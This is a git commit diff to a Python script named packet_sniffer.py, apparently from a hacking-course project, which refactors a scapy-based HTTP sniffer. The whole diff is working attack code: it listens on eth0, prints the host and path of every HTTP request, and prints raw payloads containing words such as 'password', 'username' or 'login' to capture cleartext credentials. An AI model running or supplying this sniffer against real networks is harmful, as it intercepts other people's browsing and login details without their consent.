dbd167bdf03968dc6da88f0b2d472f92b22842ec
EEthanZZ <zycc2727@gmail.com>
2023-09-18 06:12:56 -0400

    capture the url and code management

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -10,15 +10,25 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    load = packet[scapy.Raw].load
+    keywords = ["pass", "password", "uname", "username", "login"]
+    for i in keywords:
+        if i in str(load):
+            print(load)
+            break
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print(url)
         if packet.haslayer(scapy.Raw):
-            load = packet[scapy.Raw].load
-            keywords = ["pass", "password", "uname", "username", "login"]
-            for i in keywords:
-                if i in str(load):
-                    print(load)
-                    break
+            get_login_info(packet)
 
 
 sniff("eth0")
